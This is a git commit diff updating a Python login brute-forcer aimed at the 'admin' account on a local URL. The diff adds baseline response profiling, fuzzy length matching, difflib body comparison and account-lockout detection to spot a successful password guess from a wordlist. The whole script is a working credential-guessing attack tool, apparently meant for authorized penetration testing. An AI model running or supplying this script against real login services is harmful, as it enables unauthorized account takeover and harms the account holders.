761d4d356f7e21e342ae7dece4177967b297e15c
sqlifuzzer <sqlifuzzer@users.noreply.github.com>
2026-07-10 22:03:42 +0100

    Update loginBruteForcer.py
    Fixed location header checking.
    Added response body comparison with difflib.
    Added fuzzy match on length variation.

--- loginBruteForcer.py
+++ loginBruteForcer.py
@@ -1,13 +1,25 @@
 import requests
+import time
+from difflib import SequenceMatcher
 
-# username to target goes here:
 username = "admin"
 
-# path to password list goes here:
-path_to_password_list = "/usr/share/wordlists/rockyou.txt"
+url = "http://127.0.0.1:8989/login"
 
-# set whether you want the proxy to be used or not:
+path_to_password_list = "C:\\data\\credentials\\passwords.txt"
+
+# control how much length variance you want to ignore:
+length_variance_acceptance = 10
+
+# control how sensitive the response body comparison detection logic is:
+comparison_sensitivity = 0.82
+
+# Control whether proxy should be used:
 proxy = False
+
+# be polite and introduce a time delay between each request:
+# default is 1 mS
+time_delay = 0.001
 
 # proxy settings here:
 http_proxy = "http://127.0.0.1:8080"
@@ -22,61 +34,58 @@ proxies = {
 with open(path_to_password_list, 'r') as file:
     payloadList = file.read().splitlines()
 
+# used to compare the baseline body with each received body:
+def compare_two_strings(a, b):
+    return SequenceMatcher(None, a, b).ratio()
+
 sampleData = ["ydgwj", "87234yrwhe", "9438r3jkhfgh4r", "87y4rfghfgh3iu4r", "934r3rkjhisdkfjh", "sdjfhsfhi",
               "234y7ru34khrkjh", username]
-
-print("[i] Username: " + username)
-print("[i] Password list: " + path_to_password_list)
-print("\n")
 
 init_response_lengths = []
 init_response_statusCodes = []
 init_response_locations = []
 
-print("[i] Running init loop to get some sample data about the login responses\n")
+print("[i] Username:             " + username)
+print("[i] Password list:        " + path_to_password_list)
+
+print("[i] Running init loop to get some sample data about the login responses")
 
 password = "3847yrikwehrkwjh"
+location_header = False
 
-check_location = False
-
-# the initialization loop:
+# the initialisation loop:
 for testusername in sampleData:
-    # paste burp0_url, burp0_headers and burp0_data here:
-    # replace username and password with variables testusername and password
-    burp0_url = "http://127.0.0.1:9080/j_acegi_security_check"
-    burp0_cookies = {"JSESSIONID.06b898ae": "node0do08h9p1n5u446x64ay8ppf04.node0"}
-    burp0_headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"130\"",
-                     "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Linux\"", "Accept-Language": "en-GB,en;q=0.9",
-                     "Origin": "http://127.0.0.1:9080", "Content-Type": "application/x-www-form-urlencoded",
-                     "Upgrade-Insecure-Requests": "1",
-                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
-                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-                     "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
-                     "Sec-Fetch-Dest": "document", "Referer": "http://127.0.0.1:9080/login?from=%2F",
-                     "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
-    burp0_data = {"j_username": testusername, "j_password": password, "from": "/", "Submit": "Sign in"}
+    time.sleep(time_delay)
+    cookies = {"JSESSIONID.06b898ae": "node0do08h9p1n5u446x64ay8ppf04.node0"}
+    headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"130\""}
+    data = {"username": testusername, "password": password}
 
     if proxy:
-        res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, cookies=burp0_cookies, proxies=proxies,
+        res = requests.post(url, headers=headers, data=data, cookies=cookies, proxies=proxies,
                             verify=False, allow_redirects=False)
     else:
-        res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, cookies=burp0_cookies, verify=False,
+        res = requests.post(url, headers=headers, data=data, cookies=cookies, verify=False,
                             allow_redirects=False)
+    location_header = False
+    for h in res.headers:
+        if h.lower() == "location":
+            location_header = True
 
-    if res.headers["location"] != "":
-        check_location = True
+    init_response_location_value = 'N/A'
+    if location_header:
         init_response_location = len(res.headers["location"])
         init_response_location_value = res.headers["location"]
         init_response_locations.append(init_response_location)
+
     init_response_length = str(len(res.content))
     init_response_statusCode = str(res.status_code)
+    init_response_body = str(res.content)
 
-    init_result = "Length: " + init_response_length + " Status: " + init_response_statusCode  # + " Location: " + init_response_location
+    init_result = "[i] Length: " + init_response_length + " Status: " + init_response_statusCode + " Location: " + init_response_location_value
     init_response_lengths.append(init_response_length)
     init_response_statusCodes.append(init_response_statusCode)
     print(init_result)
 
-print("\n")
 init_max_lengths = max(init_response_lengths)
 init_min_lengths = min(init_response_lengths)
 init_length_variance = int(init_max_lengths) - int(init_min_lengths)
@@ -85,31 +94,30 @@ init_max_status_code = max(init_response_statusCodes)
 init_min_status_code = min(init_response_statusCodes)
 init_status_variance = int(init_max_status_code) - int(init_min_status_code)
 
-init_max_locations = max(init_response_locations)
-init_min_locations = min(init_response_locations)
-init_locations_variance = int(init_max_locations) - int(init_min_locations)
+if location_header:
+    init_max_locations = max(init_response_locations)
+    init_min_locations = min(init_response_locations)
+    init_locations_variance = int(init_max_locations) - int(init_min_locations)
 
 if init_length_variance == 0:
     print("[i] No length variance found")
-    print("[i]      Response length: " + init_response_length)
+    print("[i] Response length: " + init_response_length)
 else:
     print("[i] Length variance detected: " + str(init_length_variance))
 
 if init_status_variance == 0:
     print("[i] No status variance found")
-    print("[i]      Status code: " + init_response_statusCode)
+    print("[i] Status code: " + init_response_statusCode)
 else:
     print("[i] Status code variance detected: " + str(init_status_variance))
 
-if check_location:
+if location_header:
     if init_locations_variance == 0:
         print("[i] No location variance found")
-        print("[i]      Location: " + init_response_location_value)
+        print("[i] Location: " + init_response_location_value)
     else:
         print("[i] Status code variance detected: " + str(init_status_variance))
-        print("[i]      Location: " + init_response_location_value)
-
-print("\n")
+        print("[i] Location: " + init_response_location_value)
 
 count = len(payloadList)
 loopCounter = 0
@@ -119,36 +127,72 @@ print("[i] Starting login brute force with " + str(count) + " passwords.")
 results = []
 # the main loop:
 for password in payloadList:
-    # paste burp0_data here:
-    # replace username and password with variables username and password
-    burp0_data = {"j_username": username, "j_password": password, "from": "/", "Submit": "Sign in"}
+    time.sleep(time_delay)
+    data = {"username": username, "password": password}
 
     if proxy:
-        res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, cookies=burp0_cookies, proxies=proxies,
+        res = requests.post(url, headers=headers, data=data, cookies=cookies, proxies=proxies,
                             verify=False, allow_redirects=False)
     else:
-        res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, cookies=burp0_cookies, verify=False,
+        res = requests.post(url, headers=headers, data=data, cookies=cookies, verify=False,
                             allow_redirects=False)
 
     response_length = str(len(res.content))
     response_statusCode = str(res.status_code)
-    if check_location:
+    response_body = str(res.content)
+    if location_header:
         response_location_value = res.headers["location"]
-        result = "[!] Length: " + response_length + " Status: " + response_statusCode + " Location: " + response_location_value + " Password: " + password
+        result = "[!] Length: " + response_length + " Status: " + response_statusCode + " Location: " + response_location_value + " Username: " + username + ":" + password
     else:
-        result = "[!] Length: " + response_length + " Status: " + response_statusCode + " Password: " + password
+        result = "[!] Length: " + response_length + " Status: " + response_statusCode + " - Credentials: " + username + ":" + password
 
     if response_length != init_response_length:
-        print(result)
-        break
-    if response_statusCode != init_response_statusCode:
-        print(result)
-        break
-    if check_location:
-        response_location_value = res.headers["location"]
-        if response_location_value != init_response_location_value:
+        #print("[!] Length difference detected")
+        #print(result)
+        if int(response_length) > int(init_response_length) + int(length_variance_acceptance):
+            print("[!] Sufficient length difference detected")
             print(result)
             break
+        if int(response_length) <= int(init_response_length) - int(length_variance_acceptance):
+            print("[!] Sufficient length difference detected")
+            print(result)
+            break
+    if response_statusCode != init_response_statusCode:
+        print("[!] Status code difference detected")
+        print(result)
+        break
+    if location_header:
+        response_location_value = res.headers["location"]
+        if response_location_value != init_response_location_value:
+            print("[!] Location difference detected")
+            print(result)
+            break
+
+    if "lock" in response_body.lower():
+            print("[!] Potential Account Locking detected")
+            print("[!] Attempt count: " + str(loopCounter + 1))
+            print(str(response_body))
+            print(result)
+            break
+
+    if init_response_body != response_body:
+        ratio = compare_two_strings(init_response_body, response_body)
+        if ratio < comparison_sensitivity:
+            print("[!] Body response difference detected: " + str(ratio))
+            print("[!] Baseline:  " + str(init_response_body))
+            x = SequenceMatcher(None, init_response_body, response_body)
+            m = x.get_matching_blocks()
+            response_body_new = ""
+            i = 0
+            for m in x.get_matching_blocks():
+                if m.b > i:
+                    response_body_new += f"\033[91m{response_body[i:m.b]}\033[0m"
+                response_body_new += response_body[m.b:m.b + m.size]
+                i = m.b + m.size
+            print("[!] Latest:    " + response_body_new)
+            print(result)
+            break
+
     loopCounter += 1
     if (loopCounter % 100) == 0:
         print("[i] Count: " + str(loopCounter) + " of " + str(count))
